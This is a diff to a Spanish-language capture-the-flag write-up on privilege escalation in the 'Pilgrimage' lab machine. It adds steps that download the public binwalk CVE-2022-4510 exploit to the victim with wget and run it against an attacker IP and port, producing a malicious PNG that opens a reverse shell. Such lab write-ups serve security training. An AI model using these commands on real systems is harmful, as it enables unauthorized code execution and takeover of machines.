@@ -1046,8 +1046,109 @@ Ahora se hace el comando ls y cat al user.txt primera bandera.
 
 ## Escalada de privilegio
 
-Hice un sudo -l y no tuve exito ,escribi este comando.
+Hice un sudo -l y no tuve exito ,pero descubri algo interesante en la carpeta`.config`.
 
-`find / -perm -4000 2>/dev/null`
+```
+emily@pilgrimage:~$ ls -a
+.  ..  .bash_history  .bash_logout  .bashrc  .config  .gitconfig  .local  .profile  user.txt
+emily@pilgrimage:~$ cd .config
+emily@pilgrimage:~/.config$ ls
+binwalk
+emily@pilgrimage:~/.config$
+```
 
-&#x20;Este comando busca y muestra en la salida estándar todos los archivos en el sistema de archivos que tienen el bit setuid activado, y los errores se redirigen a `/dev/null` para evitar que se muestren.
+Binwalk es una herramienta de código abierto diseñada para analizar y buscar información en archivos binarios. Se utiliza comúnmente en el campo de la seguridad informática y la ingeniería inversa para examinar archivos y firmware en busca de patrones específicos, firmas, y otros datos relevantes.
+
+Ahora buscare su version.
+
+```
+emily@pilgrimage:~/.config$ binwalk -h
+
+Binwalk v2.3.2
+Craig Heffner, ReFirmLabs
+https://github.com/ReFirmLabs/binwalk
+```
+
+Buscando las vulneravilidades encontre este exploit.
+
+{% embed url="https://www.exploit-db.com/exploits/51249" %}
+
+{% embed url="https://nvd.nist.gov/vuln/detail/CVE-2022-4510" %}
+
+{% embed url="https://onekey.com/blog/security-advisory-remote-command-execution-in-binwalk/" %}
+
+Este script de Python parece ser un exploit que aprovecha una vulnerabilidad de ejecución remota de comandos (RCE) en la versión 2.1.2b hasta la 2.3.2 de la herramienta Binwalk.
+
+Para realizar la explotacion cree el archivo en mi pc con el script Binwalk v2.3.2 - Remote Command Execution (RCE), en la maquina victima me muevo a la carpeta tmp para decsragar el archivo creado.
+
+**Usando un Servidor HTTP Simple:**
+
+* En la máquina atacante, inicia un servidor HTTP simple:
+
+```bash
+python3 -m http.server 
+```
+
+* En la máquina víctima, utiliza `wget` o `curl` para descargar el archivo:
+
+```bash
+wget http://direccion_ip_atacante:8000/cve.py
+```
+
+<figure><img src="../../../.gitbook/assets/2023-12-06_23-51.png" alt=""><figcaption></figcaption></figure>
+
+Ahora se le otorga permiso de ejecucion.
+
+```
+emily@pilgrimage:/tmp$ chmod +x cve.py
+```
+
+Tambien realice el envio de una imagen para poder realizar la explotacion.
+
+```
+emily@pilgrimage:/tmp$ wget http://10.10.14.89:8000/652d44.png
+--2023-12-07 10:56:45--  http://10.10.14.89:8000/652d44.png
+Connecting to 10.10.14.89:8000... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 967 [image/png]
+Saving to: ‘652d44.png’
+
+652d44.png              100%[==============================>]     967  --.-KB/s    in 0.002s
+
+2023-12-07 10:56:47 (550 KB/s) - ‘652d44.png’ saved [967/967]
+
+```
+
+Para realizar la ejecucion se debe hacer los siguentes pasos.
+
+```
+python3 cve.py 652d44.png 10.10.14.89 4444
+```
+
+```
+ python3 cve.py 652d44.png 10.10.14.89 4444
+
+################################################
+------------------CVE-2022-4510----------------
+################################################
+--------Binwalk Remote Command Execution--------
+------Binwalk 2.1.2b through 2.3.2 included-----
+------------------------------------------------
+################################################
+----------Exploit by: Etienne Lacoche-----------
+---------Contact Twitter: @electr0sm0g----------
+------------------Discovered by:----------------
+---------Q. Kaiser, ONEKEY Research Lab---------
+---------Exploit tested on debian 11------------
+################################################
+
+
+You can now rename and share binwalk_exploit and start your local netcat listener.
+```
+
+Crea el png.
+
+```
+binwalk_exploit.png
+```
+
